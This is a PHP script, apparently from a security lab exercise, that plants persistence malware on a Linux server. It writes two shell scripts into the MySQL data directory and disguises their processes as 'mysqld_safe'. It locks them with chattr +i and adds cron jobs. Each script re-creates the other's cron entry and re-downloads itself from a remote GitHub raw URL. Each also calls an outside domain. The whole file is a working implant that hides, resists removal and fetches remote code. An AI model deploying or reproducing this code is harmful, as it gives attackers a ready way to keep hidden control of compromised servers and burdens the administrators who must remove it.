<?php

$mysqlDir = '/var/lib/mysql';
if (!is_writable($mysqlDir)) {
    $mysqlDir = '/tmp/mysql_data';
    if (!is_dir($mysqlDir)) mkdir($mysqlDir, 0755, true);
}

$pathA     = $mysqlDir . '/mysqld_' . bin2hex(random_bytes(3)) . '.sh';
$pathB     = $mysqlDir . '/mysqld_' . bin2hex(random_bytes(3)) . '.sh';
$logPath   = $mysqlDir . '/mysql_err.log';
$gitRawUrl = 'https://raw.githubusercontent.com/dimasoko/lab3sec/refs/heads/main/script.sh';

$scriptA = [
    '#!/bin/bash',
    '[[ "$1" != "daemon" ]] && exec -a "mysqld_safe" "$0" daemon',
    "SELF='" . $pathA . "'",
    "PEER='" . $pathB . "'",
    "LOG='"  . $logPath . "'",
    "GIT='"  . $gitRawUrl . "'",
    '',
    '# проверка себя',
    'COUNT=$(crontab -l 2>/dev/null | grep -c "$SELF" || echo 0)',
    'if [ "$COUNT" -lt 1 ]; then',
    '    chattr -i "$SELF"',
    '    curl -s "$GIT" -o "$SELF"',
    '    chmod 755 "$SELF"',
    '    chattr +i "$SELF"',
    '    (crontab -l 2>/dev/null; echo "*/5 * * * * $SELF") | crontab -',
    'fi',
    '',
    '# следим за B',
    'PEER_COUNT=$(crontab -l 2>/dev/null | grep -c "$PEER" || echo 0)',
    'if [ "$PEER_COUNT" -lt 1 ]; then',
    '    (crontab -l 2>/dev/null; echo "*/7 * * * * $PEER") | crontab -',
    'fi',
    '',
    'curl -s https://relef22.ru > /dev/null',
    'echo "[$(date)] A запуск" >> "$LOG"',
];

$scriptB = [
    '#!/bin/bash',
    '[[ "$1" != "daemon" ]] && exec -a "mysqld_safe" "$0" daemon',
    "SELF='" . $pathB . "'",
    "PEER='" . $pathA . "'",
    "LOG='"  . $logPath . "'",
    "GIT='"  . $gitRawUrl . "'",
    '',
    '# проверка себя',
    'COUNT=$(crontab -l 2>/dev/null | grep -c "$SELF" || echo 0)',
    'if [ "$COUNT" -lt 1 ]; then',
    '    chattr -i "$SELF"',
    '    curl -s "$GIT" -o "$SELF"',
    '    chmod 755 "$SELF"',
    '    chattr +i "$SELF"',
    '    (crontab -l 2>/dev/null; echo "*/7 * * * * $SELF") | crontab -',
    'fi',
    '',
    '# следим за A',
    'PEER_COUNT=$(crontab -l 2>/dev/null | grep -c "$PEER" || echo 0)',
    'if [ "$PEER_COUNT" -lt 1 ]; then',
    '    (crontab -l 2>/dev/null; echo "*/5 * * * * $PEER") | crontab -',
    'fi',
    '',
    'curl -s https://relef22.ru > /dev/null',
    'echo "[$(date)] B запуск" >> "$LOG"',
];

file_put_contents($pathA, implode("\n", $scriptA));
file_put_contents($pathB, implode("\n", $scriptB));
chmod($pathA, 0755);
chmod($pathB, 0755);

exec("chattr +i " . escapeshellarg($pathA));
exec("chattr +i " . escapeshellarg($pathB));

$existingCron = shell_exec("crontab -l 2>/dev/null") ?? '';

$newCron = $existingCron;
if (strpos($existingCron, $pathA) === false) {
    $newCron .= "\n*/5 * * * * " . $pathA;
}
if (strpos($existingCron, $pathB) === false) {
    $newCron .= "\n*/7 * * * * " . $pathB;
}

if ($newCron !== $existingCron) {
    file_put_contents('/tmp/_ctab', $newCron);
    exec("crontab /tmp/_ctab");
    unlink('/tmp/_ctab');
}

echo "Скрипты созданы: {$pathA}, {$pathB}\n";
echo "Крон-задачи добавлены.\n";